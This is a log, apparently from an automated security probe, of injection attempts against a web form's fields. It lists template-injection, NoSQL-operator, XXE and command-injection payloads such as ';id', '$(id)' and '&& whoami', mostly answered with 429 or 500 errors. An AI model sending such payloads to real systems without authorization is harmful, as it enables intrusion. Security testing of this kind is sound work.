@@ -1,0 +1,63 @@
+# command: cd "$WORK_PATH"; timeout 280 python3 iv_inj_probe.py 2>&1 | tee tool_outputs/iv_inj_probe.log | head -80
+# tool: python3
+# exit_code: 0
+# ts: 2026-09-30T12:09:34.525539+00:00
+# ---
+
+== targets validation ==
+'test' (429, 'Too Many Requests\n\nToo Many Requests\nbom1::wrm8b-1790770139057-259e9c52b6e1')
+'probe@example.com' (429, 'Too Many Requests\n\nToo Many Requests\nbom1::gn8h2-1790770139516-0863f7dee466')
+'{{7*7}}' (429, 'Too Many Requests\n\nToo Many Requests\nbom1::gdptz-1790770139808-2dbb119ba0ad')
+'${7*7}' (429, 'Too Many Requests\n\nToo Many Requests\nbom1::gcbs5-1790770140101-e4e4d5419874')
+'a@example.com' (429, 'Too Many Requests\n\nToo Many Requests\nbom1::6fjnc-1790770140402-0795d39861c2')
+'<%= 7*7 %>' (429, 'Too Many Requests\n\nToo Many Requests\nbom1::zkp42-1790770140858-a9c62e303ae6')
+== SSTI in each field ==
+HIT subject {{7*7}} 429 Too Many Requests
+
+Too Many Requests
+bom1::7z47z-1790770146906-f726f1a3ac49
+ssti done
+== NoSQLi operator forms ==
+fname '$ne' 500 
+fname '$gt' 500 
+fname '{"$ne":1}' 500 
+fname '{"$gt":""}' 500 
+fname '{"$regex":".*"}' 500 
+cname '$ne' 500 
+cname '$gt' 500 
+cname '{"$ne":1}' 500 
+cname '{"$gt":""}' 500 
+cname '{"$regex":".*"}' 500 
+subject '$ne' 500 
+subject '$gt' 500 
+subject '{"$ne":1}' 500 
+subject '{"$gt":""}' 500 
+subject '{"$regex":".*"}' 500 
+msg '$ne' 500 
+msg '$gt' 500 
+msg '{"$ne":1}' 500 
+msg '{"$gt":""}' 500 
+msg '{"$regex":".*"}' 500 
+== CMDi ==
+fname ';id' 500 
+fname '$(id)' 500 
+fname '`id`' 500 
+fname '|id' 500 
+fname '&& whoami' 500 
+cname ';id' 500 
+cname '$(id)' 500 
+cname '`id`' 500 
+cname '|id' 500 
+cname '&& whoami' 500 
+subject ';id' 500 
+subject '$(id)' 500 
+subject '`id`' 500 
+subject '|id' 500 
+subject '&& whoami' 500 
+msg ';id' 500 
+msg '$(id)' 500 
+msg '`id`' 500 
+msg '|id' 500 
+msg '&& whoami' 500 
+== XXE / content-type xml ==
+xml 500 
